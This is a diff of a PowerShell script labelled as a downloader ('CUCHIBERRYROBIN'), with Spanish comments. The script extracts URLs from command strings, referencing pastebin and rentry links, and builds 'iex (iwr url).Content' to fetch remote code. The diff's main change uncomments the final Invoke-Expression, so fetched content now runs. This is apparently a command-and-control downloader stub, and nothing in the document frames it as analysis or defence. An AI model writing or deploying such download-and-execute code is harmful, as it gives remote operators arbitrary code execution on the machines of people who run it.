@@ -1,4 +1,4 @@
-Ôªø#Downloader CUCHIBERRYROBIN
+#Downloader CUCHIBERRYROBIN
 $Conf_Hashtag_init="#CUCHIBERRYROBIN"
 $Conf_Hashtag_end="#FIN"
 
@@ -47,10 +47,10 @@ $notify.visible = $true
 $notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)
 
 #$resultado = " $ https://rentry.co/6vkoq/raw"
-#$resultado = " √±C https://pastebin.com/raw/R6sTE0GK"
+#$resultado = " ÒC https://pastebin.com/raw/R6sTE0GK"
 #COMANDOS 
 # $ httpimplica descargar y ejecutar script ejemplo $ https://pastebin.com/raw/ABiV0rH7
-# √±C implica firmado con openssl en URL √±C https://pastebin.com/raw/R6sTE0GK
+# ÒC implica firmado con openssl en URL ÒC https://pastebin.com/raw/R6sTE0GK
 
 
 $patron = '\$\shttp[^\s]+'
@@ -60,11 +60,11 @@ if ($resultado -match $patron) {
     $resultado = "iex (iwr '$url' -UseBasicParsing).Content"
 }
 
-# Buscar la posici√≥n de "√±C detro de resultado, pero como no cabe, debe ir unido al $ una vez descargado"
-$posicion = $resultado.IndexOf('√±C')
+# Buscar la posiciÛn de "ÒC detro de resultado, pero como no cabe, debe ir unido al $ una vez descargado"
+$posicion = $resultado.IndexOf('ÒC')
 
 if ($posicion -ne -1) {
-    # Extraer el contenido posterior a "√±C"
+    # Extraer el contenido posterior a "ÒC"
     $resultado = $resultado.Substring($posicion + 3) 
     $resultado = (iwr $resultado -UseBasicParsing).Content
     
@@ -91,7 +91,7 @@ $notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$
 Write-Output "COMANDO:"$resultado
 
 
-#Invoke-Expression $resultado
+Invoke-Expression $resultado
 
 
 
